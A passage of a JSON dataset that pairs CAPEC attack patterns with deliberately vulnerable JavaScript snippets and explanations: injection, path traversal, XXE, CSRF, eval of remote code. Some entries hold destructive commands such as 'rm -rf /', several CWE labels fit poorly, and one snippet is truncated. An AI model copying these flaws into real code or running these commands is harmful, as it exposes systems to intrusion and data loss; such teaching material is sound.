        "description": "This code snippet demonstrates a vulnerable session management system that is susceptible to session replay attacks. The code uses express-session to manage user sessions, but it does not properly invalidate existing session identifiers when a new user logs in, allowing an attacker to reuse a stolen session ID to gain unauthorized access (CWE-384). The code also stores sensitive information in persistent cookies (CWE-539) and does not properly verify the source of data or communication (CWE-346). Additionally, the code has improper authorization checks (CWE-285) and exposure of sensitive information to unauthorized actors (CWE-200). An attacker can sniff network traffic and replay the session ID to bypass authentication (CWE-294) and gain access to protected resources."
    },
    {
        "capec_id": "61",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.cookieParser());\n\napp.get('/login', (req, res) => {\n  const sessionId = req.query.sessionId;\n  if (sessionId) {\n    res.cookie('sessionId', sessionId);\n  }\n  res.sendFile(__dirname + '/login.html');\n});\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  if (checkCredentials(username, password)) {\n    const sessionId = req.cookies.sessionId;\n    // Elevate privileges without invalidating the existing session identifier\n    res.cookie('privileges', 'elevated');\n    res.redirect('/protected');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/protected', (req, res) => {\n  const sessionId = req.cookies.sessionId;\n  const privileges = req.cookies.privileges;\n  if (privileges === 'elevated') {\n    // Perform privileged actions\n    res.send('Welcome, privileged user!');\n  } else {\n    res.status(403).send('Access denied');\n  }\n});",
        "description": "This code snippet demonstrates a session fixation vulnerability. The server relies on the client to provide a session identifier, which is then used to authenticate the user. After authentication, the server elevates the user's privileges without invalidating the existing session identifier. This allows an attacker to steal the authenticated session by providing a malicious session identifier."
    },
    {
        "capec_id": "62",
        "code_snippet": "const maliciousLink = 'https://example.com/deleteAccount?sessionID=' + getCookie('sessionID');\n\nfunction getCookie(name) {\n  const value = `; ${document.cookie}`;\n  const parts = value.split(`; ${name}=`);\n  if (parts.length === 2) return parts.pop().split(';').shift();\n}\n\n// Create a malicious iframe to send the request\nconst iframe = document.createElement('iframe');\niframe.src = maliciousLink;\ndocument.body.appendChild(iframe);\n",
        "description": "This code snippet demonstrates a CSRF attack by creating a malicious link that deletes an account when clicked. It exploits the lack of authentication for critical functions (CWE-306) and improper control of resources (CWE-664) in the targeted application. The 'getCookie' function retrieves the user's session ID from the cookie, which is then used to construct the malicious link. The link is then loaded in an iframe, allowing the attacker to 'ride' the existing session cookie and perform the malicious action without the user's knowledge or consent. The lack of SameSite attribute on the session cookie (CWE-1275) makes it vulnerable to CSRF attacks. The code also assumes that the application does not verify user requests properly (CWE-352), allowing the malicious request to be processed."
    },
    {
        "capec_id": "63",
        "code_snippet": "let userInput = '<script>alert(\"XSS\")</script>'; document.getElementById('userContent').innerHTML = userInput;",
        "description": "This code snippet demonstrates a Cross-Site Scripting (XSS) vulnerability, where user-controllable input is not properly validated or neutralized, allowing an attacker to inject malicious scripts into a web page. The userInput variable contains a script tag that will be executed by the browser, bypassing security controls and potentially leading to unauthorized actions."
    },
    {
        "capec_id": "64",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/files/*', (req, res) => {\n  const filePath = req.url.replace(/^\\/files\\//, '');\n  const file = `${__dirname}/uploads/${filePath}`;\n  res.sendFile(file);\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable Node.js Express server that is susceptible to URL encoding attacks. The server allows users to request files from the 'uploads' directory, but it does not properly handle URL encoding, making it vulnerable to path traversal attacks (CWE-22). An attacker can craft a URL with a sequence of special characters that, once interpreted by the server, will be equivalent to a forbidden URL. For example, an attacker can request '/files/%2e%2e/%2e%2e/etc/passwd' to access the system's password file. The server also lacks input validation (CWE-20) and does not properly neutralize special elements in the URL (CWE-74), making it vulnerable to other types of attacks."
    },
    {
        "capec_id": "65",
        "code_snippet": "const xhr = new XMLHttpRequest(); xhr.open('GET', 'https://example.com/updateCode', true); xhr.onload = function() { if (xhr.status === 200) { const updateCode = xhr.responseText; eval(updateCode); } }; xhr.send();",
        "description": "This JavaScript code snippet downloads executable code from a remote location without verifying its integrity, and then executes it using the eval function. The code is transmitted in cleartext, making it vulnerable to sniffing attacks. The lack of encryption and integrity checks makes it susceptible to CWE-319, CWE-311, CWE-318, CWE-693, and CWE-494."
    },
    {
        "capec_id": "66",
        "code_snippet": "const express = require('express');\nconst mysql = require('mysql');\nconst app = express();\n\nconst db = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password',\n  database: 'mydb'\n});\n\napp.get('/users/:id', (req, res) => {\n  const id = req.params.id;\n  const query = `SELECT * FROM users WHERE id = ${id}`;\n  db.query(query, (err, rows) => {\n    if (err) {\n      res.status(500).send({ message: `Error: ${err.sqlMessage}` });\n    } else {\n      res.send(rows);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript application that is susceptible to SQL injection attacks. The application uses user-controlled input to construct a SQL query without proper validation or sanitization, allowing an attacker to inject malicious SQL code. The error handling mechanism also discloses sensitive information about the database environment, which is a CWE-209 violation. The use of a dangling database cursor is also a potential security risk, as it could be exploited by an attacker to access unauthorized data."
    },
    {
        "capec_id": "67",
        "code_snippet": "const syslog = require('syslog');\n\nfunction logMessage(userInput) {\n  syslog(userInput);\n}\n\n// Example usage:\nlogMessage('This is a log message.');\nlogMessage('%s%s%s%s%s'); // Format string injection vulnerability",
        "description": "This code snippet demonstrates a format string injection vulnerability in a syslog function. The syslog function is called with user input, which can lead to a buffer overflow if the input contains malicious format string commands. This code is vulnerable to CWE-134: Use of Externally-Controlled Format String, CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow'), CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection'), CWE-20: Improper Input Validation, CWE-680: Integer Overflow to Buffer Overflow, and CWE-697: Incorrect Comparison."
    },
    {
        "capec_id": "68",
        "code_snippet": "const crypto = require('crypto');\nconst hash = crypto.createHash('md5'); // CWE-328: Use of Weak Hash\nconst codeToSign = 'malicious_code_here';\nconst signature = hash.update(codeToSign).digest('hex');\n\n// CWE-325: Missing Cryptographic Step - skipping verification step\nconst verified = true;\n\nif (verified) {\n  // CWE-506: Embedded Malicious Code - executing malicious code\n  eval(codeToSign);\n} else {\n  console.log('Code not verified');\n}\n\n// CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n// assuming a compiler optimization removes the following security check\nif (typeof verified === 'undefined') {\n  console.log('Security check removed by compiler optimization');\n}\n\n// CWE-1326: Missing Immutable Root of Trust in Hardware - assuming a hardware vulnerability\nconst secureBoot = false;\nif (!secureBoot) {\n  console.log('Secure boot bypassed');\n}",
        "description": "This JavaScript code snippet demonstrates a code signing subversion attack. It uses a weak hash function (MD5) to sign malicious code, skips the verification step, and executes the malicious code. Additionally, it highlights the potential for compiler optimizations to remove security checks and the possibility of bypassing secure boot mechanisms due to a missing immutable root of trust in hardware."
    },
    {
        "capec_id": "69",
        "code_snippet": "const exec = require('child_process').exec;\nconst userInput = \"rm -rf /\";\nexec(userInput, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.log(`stderr: ${stderr}`);\n});",
        "description": "This JavaScript code snippet demonstrates the CAPEC of executing arbitrary code with elevated privileges. The code uses the 'child_process' module to execute a system command, in this case, deleting the root directory. The command is constructed using user input, which is not sanitized, making it vulnerable to OS Command Injection (CWE-78). The code runs with elevated privileges, amplifying the consequences of the vulnerability (CWE-250). The code also allows for external control of system settings (CWE-15) and process control (CWE-114), and contains embedded malicious code (CWE-506)."
    },
    {
        "capec_id": "70",
        "code_snippet": "const adminUser = { username: 'admin', password: 'password' };\nconst defaultUsers = [{ username: 'user', password: '' }, { username: 'guest', password: 'guest' }];\n\nfunction authenticateUser(username, password) {\n  if (username === adminUser.username && password === adminUser.password) {\n    return true;\n  }\n  for (let i = 0; i < defaultUsers.length; i++) {\n    if (username === defaultUsers[i].username && password === defaultUsers[i].password) {\n      return true;\n    }\n  }\n  return false;\n}\n\n// Example usage:\nconst userInput = { username: 'admin', password: 'password' };\nif (authenticateUser(userInput.username, userInput.password)) {\n  console.log('Access granted.');\n} else {\n  console.log('Access denied.');\n}",
        "description": "This code snippet demonstrates a vulnerable authentication system that uses hard-coded credentials, default usernames and passwords, and single-factor authentication. The authenticateUser function checks if the provided username and password match the hard-coded admin credentials or any of the default user credentials. If a match is found, access is granted. This code embodies the CAPEC and CWEs by not requiring strong passwords, not implementing password aging, using hard-coded credentials, and relying on single-factor authentication."
    },
    {
        "capec_id": "71",
        "code_snippet": "const userInput = \"<script>alert('XSS')</script>\ud83d\ude00\";\nconst filter = /<script>/;\nif (!filter.test(userInput)) {\n  console.log('Input is safe');\n  const encodedInput = encodeURIComponent(userInput);\n  const url = `https://example.com/?input=${encodedInput}`;\n  console.log(url);\n} else {\n  console.log('Input is malicious');\n}",
        "description": "This code snippet demonstrates the CAPEC of circumventing content filters by using Unicode encoding. The userInput variable contains a malicious script tag, but also includes a Unicode character that is not properly handled by the filter. The filter uses a regular expression to check for script tags, but the Unicode character causes the filter to fail, allowing the malicious input to pass through. The encodedInput variable is then used to construct a URL, which could potentially lead to an XSS attack."
    },
    {
        "capec_id": "72",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/download/:file', (req, res) => {\n  const file = req.params.file;\n  const filePath = `/uploads/${file}`;\n  res.download(filePath);\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript code that is susceptible to URL encoding attacks. The code uses Express.js to create a server that allows users to download files from the /uploads directory. The file name is taken from the URL parameter without proper validation or encoding, making it vulnerable to CWE-73: External Control of File Name or Path, CWE-20: Improper Input Validation, and CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component. An attacker can manipulate the URL encoding to access arbitrary files on the server, including sensitive files outside of the intended directory."
    },
    {
        "capec_id": "73",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  const filename = req.query.filename;\n  const fileContent = `<script>alert('XSS')</script>`;\n  res.setHeader('Content-Disposition', `attachment; filename=\"${filename}\"`);\n  res.send(fileContent);\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript code that allows an attacker to inject malicious characters into a filename, which is then used to generate HTML text. The code uses the Express.js framework to create a server that accepts a filename as a query parameter and returns a response with the filename as an attachment. The filename is not validated or sanitized, allowing an attacker to inject XSS redirection code into the filename. The CWEs embodied in this code snippet include CWE-20 (Improper Input Validation), CWE-184 (Incomplete List of Disallowed Inputs), CWE-96 (Improper Neutralization of Directives in Statically Saved Code), CWE-348 (Use of Less Trusted Source), CWE-116 (Improper Encoding or Escaping of Output), CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action), CWE-86 (Improper Neutralization of Invalid Characters in Identifiers in Web Pages), and CWE-697 (Incorrect Comparison)."
    },
    {
        "capec_id": "74",
        "code_snippet": "const userState = {\n  username: 'user123',\n  paymentInfo: 'creditCard123',\n  cart: ['item1', 'item2']\n};\n\n// CWE-372: Incomplete Internal State Distinction\nfunction processPayment() {\n  if (userState.paymentInfo === 'creditCard123') {\n    // assume user is in 'paid' state\n    console.log('Payment successful!');\n  } else {\n    // but what if userState.paymentInfo is tampered with?\n    console.log('Payment failed!');\n  }\n}\n\n// CWE-315: Cleartext Storage of Sensitive Information in a Cookie\nconst cookie = 'username=' + userState.username + '; paymentInfo=' + userState.paymentInfo;\nconsole.log(cookie);\n\n// CWE-353: Missing Support for Integrity Check\nconst transmissionData = JSON.stringify(userState);\nconsole.log(transmissionData);\n\n// CWE-693: Protection Mechanism Failure\nfunction setState(newState) {\n  userState = newState;\n  // no validation or sanitization of newState\n}\n\n// CWE-1245: Improper Finite State Machines (FSMs) in Hardware Logic\nconst fsm = {\n  currentState: 'state1',\n  transition: function(event) {\n    if (event === 'event1') {\n      this.currentState = 'state2';\n    } else if (event === 'event2') {\n      this.currentState = 'state3';\n    } else {\n      // undefined state transition\n      this.currentState = 'unknown';\n    }\n  }\n};\n\n// CWE-1253: Incorrect Selection of Fuse Values\nconst fuseState = true;\nif (fuseState) {\n  console.log('System is secure');\n} else {\n  console.log('System is insecure');\n}\n\n// CWE-1265: Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls\nfunction nonReentrantCode() {\n  console.log('Non-reentrant code executed');\n  nonReentrantCode(); // nested invocation\n}\n\n// CWE-1271: Uninitialized Value on Reset for Registers Holding Security Settings\nconst securitySettings = {\n  secureMode: undefined\n};\nconsole.log(securitySettings.secureMode);\n",
        "description": "This code snippet demonstrates the CAPEC of modifying state information maintained by the target software, leading to unintended behavior. It includes examples of CWEs such as incomplete internal state distinction, cleartext storage of sensitive information, missing support for integrity check, protection mechanism failure, improper finite state machines in hardware logic, incorrect selection of fuse values, unintended reentrant invocation of non-reentrant code via nested calls, and uninitialized value on reset for registers holding security settings."
    },
    {
        "capec_id": "75",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\nconst repoPath = './repository';\n\n// CWE-349: Acceptance of Extraneous Untrusted Data With Trusted Data\n// CWE-99: Improper Control of Resource Identifiers ('Resource Injection')\nfs.readFile(path.join(repoPath, 'config.json'), 'utf8', (err, data) => {\n  if (err) {\n    console.error(err);\n    return;\n  }\n  const config = JSON.parse(data);\n  const userInput = '{ \"admin\": true }'; // CWE-346: Origin Validation Error\n  const mergedConfig = Object.assign(config, JSON.parse(userInput));\n  fs.writeFile(path.join(repoPath, 'config.json'), JSON.stringify(mergedConfig), (err) => {\n    if (err) {\n      console.error(err);\n      return;\n    }\n    console.log('Config updated.');\n  });\n});\n\n// CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')\nconst command = `git add . && git commit -m \"${userInput}\"`;\nrequire('child_process').exec(command, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.log(`stderr: ${stderr}`);\n});\n\n// CWE-353: Missing Support for Integrity Check\n// CWE-354: Improper Validation of Integrity Check Value\nconst data = fs.readFileSync(path.join(repoPath, 'data.txt'));\nconst checksum = require('crypto').createHash('md5').update(data).digest('hex');\nconsole.log(`Checksum: ${checksum}`);",
        "description": "This code snippet demonstrates a vulnerable JavaScript application that allows an attacker to modify configuration files in a CVS repository, leading to unauthorized access. The code accepts extraneous untrusted data, uses it to construct commands, and fails to validate the integrity of transmitted data."
    },
    {
        "capec_id": "76",
        "code_snippet": "const fs = require('fs');\nconst userInput = '../etc/passwd';\nfs.readFile(userInput, (err, data) => {\n  if (err) {\n    console.error(err);\n    return;\n  }\n  console.log(data);\n});",
        "description": "This code snippet demonstrates a path traversal vulnerability (CWE-23, CWE-22) where user input is used to construct a file path without proper validation, allowing an attacker to access sensitive files outside of the intended directory. The code also lacks proper authorization checks (CWE-285) and does not drop elevated privileges (CWE-272) when accessing the file system. Additionally, it does not properly neutralize special elements in the user input (CWE-77, CWE-74), making it vulnerable to command injection and other attacks."
    },
    {
        "capec_id": "77",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/admin', (req, res) => {\n  if (req.query.isAdmin) {\n    isAdmin = req.query.isAdmin;\n  }\n  if (isAdmin) {\n    res.send('Welcome Admin!');\n  } else {\n    res.send('Access Denied!');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates the CAPEC of user-controlled variables. The code uses an Express.js server to create an admin endpoint that can be accessed by modifying the isAdmin variable through a query parameter. This allows an attacker to bypass authentication and access the admin page by simply adding isAdmin=true to the URL. This code embodies CWE-15, CWE-94, CWE-96, CWE-285, CWE-302, CWE-473, and CWE-1321."
    },
    {
        "capec_id": "78",
        "code_snippet": "const userInput = '\\\\..\\\\/secretFile';\nconst filteredInput = userInput.replace('..', '');\nconst canonicalizedInput = filteredInput.replace(/\\\\\\\\/g, '/');\nconst filePath = \\`/uploads/${canonicalizedInput}\\`;\nfs.readFile(filePath, (err, data) => {\n  if (err) {\n    console.error(err);\n  } else {\n    console.log(data);\n  }\n});",
        "description": "This code snippet demonstrates the CAPEC attack by using a backslash in alternate encoding to bypass input validation and filtering. The userInput variable contains a malicious path traversal attempt, which is not properly validated or canonicalized. The filteredInput variable attempts to remove the '..' sequence, but the canonicalizedInput variable incorrectly replaces backslashes with forward slashes, allowing the malicious path to be constructed. The filePath variable is then used to read a sensitive file, demonstrating the vulnerability."
    },
    {
        "capec_id": "79",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/files/*', (req, res) => {\n  const filePath = req.params[0].replace(/\\\\/g, '/');\n  if (filePath.startsWith('/')) {\n    filePath = filePath.substring(1);\n  }\n  const file = filePath.split('/').pop();\n  if (file) {\n    res.sendFile(__dirname + '/' + filePath);\n  } else {\n    res.status(404).send('File not found');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript code that is susceptible to directory traversal attacks due to improper handling of slash characters. The code uses the express.js framework to create a server that serves files from the current directory. The vulnerability lies in the fact that the code replaces backslashes with forward slashes, but does not properly validate the input file path. This allows an attacker to traverse the file system by injecting sequences of slashes, potentially leading to unauthorized access to sensitive files. The related CWEs include CWE-173, CWE-180, CWE-181, CWE-20, CWE-74, CWE-73, CWE-22, CWE-185, CWE-200, CWE-697, and CWE-707."
    },
    {
        "capec_id": "80",
        "code_snippet": "const userInput = '%EF%BC%BC<script>alert(1)</script>'; const parser = new DOMParser(); const xmlDoc = parser.parseFromString(userInput, 'text/xml'); if(xmlDoc.documentElement.nodeName === 'script') { console.log('Invalid input'); } else { console.log('Valid input'); }",
        "description": "This code snippet demonstrates the CAPEC attack by submitting a UTF-8 encoded malicious input to a parser that performs security-critical validity checks against the encoded form of the input. The input is a UTF-8 encoded script tag that can bypass validation logic. The parser interprets the illegal octet sequence as a character, allowing the malicious input to be executed. This code relates to CWEs 173, 172, 180, 181, 73, 74, 20, 697, and 692."
    },
    {
        "capec_id": "81",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst fs = require('fs');\n\napp.post('/log', (req, res) => {\n  const logData = req.body.logData;\n  fs.appendFile('log.txt', logData + '\\n', (err) => {\n    if (err) {\n      console.error(err);\n      res.status(500).send('Error writing to log');\n    } else {\n      res.send('Log written successfully');\n    }\n  });\n});",
        "description": "This code snippet is vulnerable to Web Logs Tampering attacks. The code does not validate or sanitize the user input (CWE-20) before writing it to the log file. An attacker can inject malicious data, including CRLF sequences (CWE-93), special elements (CWE-75), or escape sequences (CWE-150), into the log file, potentially leading to log tampering or injection attacks. Additionally, the code does not properly encode or escape the output (CWE-116), which can cause issues when processing the log file. The code also lacks proper input validation and neutralization, making it vulnerable to CWE-117, CWE-221, CWE-96, CWE-276, and CWE-279."
    },
    {
        "capec_id": "82",
        "code_snippet": "const parser = new DOMParser();\nconst xmlString = '<!ENTITY xxe SYSTEM \"file:///etc/passwd\"> <doc>&xxe;</doc>'; \nconst doc = parser.parseFromString(xmlString, 'application/xml');\nconsole.log(doc.documentElement.textContent);",
        "description": "This JavaScript code snippet demonstrates a vulnerability to XML External Entity (XXE) injection, which is a type of CWE-611. It uses a DOMParser to parse a malicious XML string that references an external entity, allowing an attacker to access sensitive files on the system. The code also lacks proper XML validation, making it vulnerable to CWE-112. Additionally, the use of recursive entity references in the DTD can lead to an XML Entity Expansion attack, which is CWE-776. The code's failure to properly restrict the XML input makes it vulnerable to CWE-91, XML Injection."
    },
    {
        "capec_id": "83",
        "code_snippet": "const xpath = \"//users[user=\" + userInput + \"]/password\";\nconst xmlDoc = new DOMParser().parseFromString(xmlData, \"text/xml\");\nconst nodeList = xmlDoc.evaluate(xpath, xmlDoc, null, XPathResult.ANY_TYPE, null);\nconst password = nodeList.iterateNext().textContent;\nif (password === userInput) {\n  console.log(\"Authenticated successfully!\");\n} else {\n  console.log(\"Authentication failed.\");\n}",
        "description": "This code snippet demonstrates XPath Injection vulnerability. It takes user input to construct an XPath expression, which is then used to query an XML database. The code does not properly sanitize the user input, allowing an attacker to inject malicious XPath expressions and potentially bypass authentication or retrieve sensitive information."
    },
    {
        "capec_id": "84",
        "code_snippet": "const xq = require('xquery');\nconst xmldb = xq.getDatabase();\nconst userInput = req.query.userInput;\nconst query = 'for $i in collection(\"mycollection\") where $i/name = \"' + userInput + '\" return $i';\nconst result = xmldb.execute(query);\nres.send(result.toArray());",
        "description": "This JavaScript code snippet is vulnerable to XQuery Injection (CWE-652). It takes user input from a query parameter and injects it into an XQuery expression without proper validation or sanitization, allowing an attacker to control the structure of the query and potentially access unauthorized data or execute malicious commands."
    },
    {
        "capec_id": "85",
        "code_snippet": "const xhr = new XMLHttpRequest();\nconst targetUrl = 'https://example.com';\nconst params = 'param1=value1&param2=value2';\n\nxhr.open('GET', targetUrl + '?' + params, true);\n\nxhr.onload = function() {\n  if (xhr.status === 200) {\n    const response = xhr.responseText;\n    const scriptTag = document.createElement('script');\n    scriptTag.src = 'https://example.com/maliciousScript';\n    document.body.appendChild(scriptTag);\n  }\n};\n\nxhr.send();",
        "description": "This JavaScript code snippet demonstrates an Ajax-based vulnerability scanner that exploits multiple CWEs. It sends a GET request to a target URL with user-controllable input (CWE-20) and uses the response to inject a malicious script tag (CWE-79, CWE-116, CWE-692). The script tag's src attribute is set to a malicious script, which can lead to XSS attacks. The code also lacks proper input validation and encoding, making it vulnerable to HTTP request/response splitting (CWE-113) and static code injection (CWE-96). Additionally, the code uses a less trusted source of data (CWE-348) and has an incomplete list of disallowed inputs (CWE-184). The code's improper neutralization of invalid characters in identifiers (CWE-86) further increases its vulnerability to attacks."
    },
    {
        "capec_id": "86",
        "code_snippet": "const userInput = '<script>alert(\"XSS\")</script>'; const httpResponse = { headers: { 'Set-Cookie': userInput } };",
        "description": "This code snippet demonstrates a vulnerable HTTP response that sets a cookie based on unvalidated user input, allowing an attacker to inject malicious scripts through the 'Set-Cookie' header, exploiting CWE-644 and CWE-79."
    },
    {
        "capec_id": "87",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/admin/deleteUser', (req, res) => {\n  const userId = req.query.userId;\n  // No authentication or authorization check\n  deleteUser(userId);\n  res.send(`User ${userId} deleted successfully`);\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates forceful browsing vulnerability. The '/admin/deleteUser' endpoint can be accessed directly without any authentication or authorization check, allowing an attacker to delete any user by simply providing the userId in the query string. This is a classic example of CWE-425: Direct Request ('Forced Browsing'), CWE-285: Improper Authorization, and CWE-598: Use of GET Request Method With Sensitive Query Strings."
    },
    {
        "capec_id": "88",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction getUserDetails(username) {\n  const command = `grep ${username} /etc/passwd`;\n  exec(command, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.log(`stderr: ${stderr}`);\n  });\n}\n\ngetUserDetails('admin');",
        "description": "This JavaScript code snippet is vulnerable to OS command injection. The 'getUserDetails' function takes a username as input and constructs a command to search for the user in the '/etc/passwd' file. However, it does not validate or neutralize the input, allowing an attacker to inject arbitrary OS commands. For example, if an attacker calls 'getUserDetails('admin; rm -rf /')', the code will execute the 'rm -rf /' command, deleting the entire filesystem."
    },
    {
        "capec_id": "89",
        "code_snippet": "const dns = require('dns');\n\nfunction getHostname(ip) {\n  return new Promise(resolve => {\n    dns.reverse(ip, (err, hostname) => {\n      if (err) {\n        console.error(err);\n      } else {\n        resolve(hostname);\n      }\n    });\n  });\n}\n\nasync function handleRequest(req, res) {\n  const ip = req.ip;\n  const hostname = await getHostname(ip);\n  if (hostname === 'trusted-bank.com') {\n    // trust the request\n    res.send('Welcome to trusted-bank.com!');\n  } else {\n    res.send('Access denied.');\n  }\n}\n\n// assume express.js framework\napp.get('/', handleRequest);\n",
        "description": "This code snippet demonstrates a pharming attack vulnerability. The server-side code relies on the client's IP address to determine the hostname using reverse DNS resolution (CWE-350). It then trusts the request if the hostname matches a trusted domain (CWE-602). However, an attacker can manipulate the DNS resolution to impersonate the trusted domain, allowing them to intercept sensitive data. The code also lacks input validation, making it vulnerable to cross-site scripting (CWE-79). Additionally, the code downloads and executes code without integrity checks (CWE-494), further increasing the attack surface."
    },
    {
        "capec_id": "90",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  const challenge = Math.floor(Math.random() * 10000);\n  res.cookie('challenge', challenge);\n  res.send(`Please respond with the challenge: ${challenge}`);\n});\n\napp.post('/login-response', (req, res) => {\n  const username = req.body.username;\n  const response = req.body.response;\n  const storedChallenge = req.cookies.challenge;\n  if (response === storedChallenge) {\n    // Authentication successful, but vulnerable to reflection attack\n    res.send(`Welcome, ${username}!`);\n  } else {\n    res.status(401).send('Invalid response');\n  }\n});",
        "description": "This code snippet demonstrates a simple authentication protocol vulnerable to a reflection attack (CWE-301). The server generates a random challenge and sends it to the client, which is expected to respond with the same challenge. However, an attacker can intercept the challenge and respond with it, impersonating the legitimate user. This code also relates to CWE-303 (Incorrect Implementation of Authentication Algorithm) and CWE-290 (Authentication Bypass by Spoofing) as the authentication mechanism is flawed and can be bypassed. Additionally, it is susceptible to CWE-294 (Authentication Bypass by Capture-replay) and CWE-305 (Authentication Bypass by Primary Weakness) if an attacker can capture and replay the authentication request."
    },
    {
        "capec_id": "91",
        "code_snippet": "const userInput = \\",
        "description": "This code snippet demonstrates a cross-site scripting (XSS) vulnerability. The userInput variable contains malicious script code, which is then inserted into an HTML IMG tag without proper sanitization. The resulting imgTag string is then injected into the web page, allowing the malicious script to execute."
    },
    {
        "capec_id": "92",
        "code_snippet": "function vulnerableFunction(size) {\n  var buffer = new Array(size);\n  var offset = 0;\n  while (offset < size) {\n    buffer[offset] = 1;\n    offset += 2**31 - 1; // increment offset to cause integer overflow\n  }\n  return buffer;\n}\n\n// Example usage:\nvulnerableFunction(10);",
        "description": "This JavaScript code snippet demonstrates an integer overflow vulnerability. The function `vulnerableFunction` takes an integer `size` as input and allocates an array of that size. It then enters a loop where it increments the `offset` variable by a large value (2^31 - 1) in each iteration, causing an integer overflow. This can lead to unexpected behavior, such as a buffer overflow, as the `offset` variable wraps around to a small or negative value. This is an example of CWE-190 (Integer Overflow or Wraparound) and CWE-680 (Integer Overflow to Buffer Overflow)."
    },
    {
        "capec_id": "93",
        "code_snippet": "const fs = require('fs');\nconst userInput = '<script>alert(\"XSS\")</script>'; // CWE-75: Unsanitized user input\nconst logFile = 'log.txt';\n\n// CWE-117: Improper output neutralization for logs\nfs.appendFile(logFile, userInput + '\\n', (err) => {\n  if (err) {\n    console.error(err);\n  }\n});\n\n// CWE-150: Improper neutralization of escape sequences\nconst maliciousInput = '\\x1b[2J\\x1b[H'; // Escape sequence to clear the console\nfs.appendFile(logFile, maliciousInput + '\\n', (err) => {\n  if (err) {\n    console.error(err);\n  }\n});\n\n// CWE-532: Insertion of sensitive information into log file\nconst sensitiveData = 'username: admin, password: password123';\nfs.appendFile(logFile, sensitiveData + '\\n', (err) => {\n  if (err) {\n    console.error(err);\n  }\n});\n\n// CWE-779: Logging of excessive data\nfor (let i = 0; i < 10000; i++) {\n  fs.appendFile(logFile, 'Excessive log data ' + i + '\\n', (err) => {\n    if (err) {\n      console.error(err);\n    }\n  });\n}",
        "description": "This JavaScript code snippet demonstrates the CAPEC attack by injecting malicious log entries into a log file. It showcases CWE-117 by not neutralizing user input, CWE-75 by not sanitizing special elements, CWE-150 by not neutralizing escape sequences, CWE-532 by inserting sensitive information, and CWE-779 by logging excessive data."
    },
    {
        "capec_id": "94",
        "code_snippet": "const https = require('https');\n\nconst server = https.createServer((req, res) => {\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end('Hello World\\n');\n});\n\nserver.listen(8000, () => {\n  console.log('Server running on port 8000');\n});\n\n// CWE-300: Channel Accessible by Non-Endpoint\nconst socket = require('socket.io')(server);\nsocket.on('connection', (client) => {\n  // CWE-290: Authentication Bypass by Spoofing\n  // No authentication or verification of client identity\n  client.emit('welcome', 'Hello World');\n});\n\n// CWE-593: Authentication Bypass: OpenSSL CTX Object Modified after SSL Objects are Created\nconst tls = require('tls');\nconst sslContext = tls.createSecureContext({\n  key: fs.readFileSync('server-key.pem'),\n  cert: fs.readFileSync('server-cert.pem')\n});\nsslContext.options.ecdhCurve = 'auto'; // modifying SSL context after creation\n\n// CWE-287: Improper Authentication\nconst auth = (username, password) => {\n  // No proper authentication mechanism, just checking for non-empty strings\n  if (username && password) {\n    return true;\n  } else {\n    return false;\n  }\n};\n\n// CWE-294: Authentication Bypass by Capture-replay\nconst captureReplay = (req) => {\n  // No mechanism to prevent capture-replay attacks\n  if (req.headers['Authorization']) {\n    return true;\n  } else {\n    return false;\n  }\n};",
        "description": "This code snippet demonstrates a vulnerable Node.js server that is susceptible to man-in-the-middle attacks, authentication bypass, and capture-replay attacks. The server does not properly verify the identity of clients, does not ensure the integrity of the communication channel, and has an improperly implemented authentication mechanism. An adversary can exploit these weaknesses to access or influence the communication channel, leading to unauthorized access or data tampering."
    },
    {
        "capec_id": "95",
